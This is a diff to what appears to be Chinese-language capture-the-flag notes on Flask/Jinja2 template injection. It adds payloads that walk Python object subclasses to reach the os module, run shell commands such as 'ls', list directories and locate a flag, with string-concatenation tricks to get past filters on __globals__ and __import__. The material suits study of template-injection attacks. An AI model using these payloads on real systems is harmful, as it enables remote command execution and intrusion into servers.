@@ -188,8 +188,10 @@ _io.TextIOWrapper 可以文件读取，可能在122位。
 ```
 目录查询
 {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}
-().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')
+
+{{().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
  本来想直接用listdir('/')，但这里listdir同样被ban了
+
 读取目录flasklight
 {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls /flasklight').read()}}
 读取flag
@@ -222,6 +224,9 @@ _io.TextIOWrapper 可以文件读取，可能在122位。
 案例：
 如由于使用['__globals__']会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式['__glo'+'bals__']
 ```
+{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}
+
+
 等效：
 * `request.__class__`
 * `request["__class__"]`
